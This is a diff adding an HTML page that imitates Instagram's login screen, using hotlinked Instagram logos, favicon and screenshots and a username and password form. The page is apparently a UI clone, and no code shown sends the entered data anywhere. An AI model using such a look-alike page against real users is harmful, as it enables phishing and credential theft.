@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="icon"  href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
+    <link rel="stylesheet" href="./index.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
+</head>
+<body style="background-color: whitesmoke;">
+    <div class="main">
+       
+        
+        <div class="images">
+             <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot2.png/4d62acb667fb.png" alt=""class="image"  style="position:basolute;display: block;"> 
+             <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot4.png/a4fd825e3d49.png" alt="" class="image" id="image2" style="display: none;position: absolute;"> 
+            <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot1.png/fdfe239b7c9f.png" alt="" class="image"  id="image3" style="display: none;position: absolute;"> 
+        </div>
+        <form action="" class="details" style="width: 350px; height:320px;position: absolute;left: 50%;border:2px rgb(207, 205, 205) solid;background-color: white;border-radius: 8px;">
+            <div >
+          <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram">
+                </div>
+          <br>
+          <input type="text" name="identity" id=" user" placeholder="Phone number,username or email address" style="height: 30px;width: 290px;" ng-model="input">
+            <br>
+            <br><br>
+            <input type="password" name="password" id="pass" placeholder="Password" style="height: 30px;width: 290px;">
+                <br><br><br>
+            <button type="submit" style="background-color:#0095f6;color: white;border: 1px solid transparent;height: 30px;width: 236px;border-radius: 7px;">Login</button> 
+            
+            </form>
+            <div>
+                <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico"> <a href=""> Login with Facebook</a>
+
+            </div>
+    </div>
+</body>
+<script src="./frontend.js"></script>
+</html>
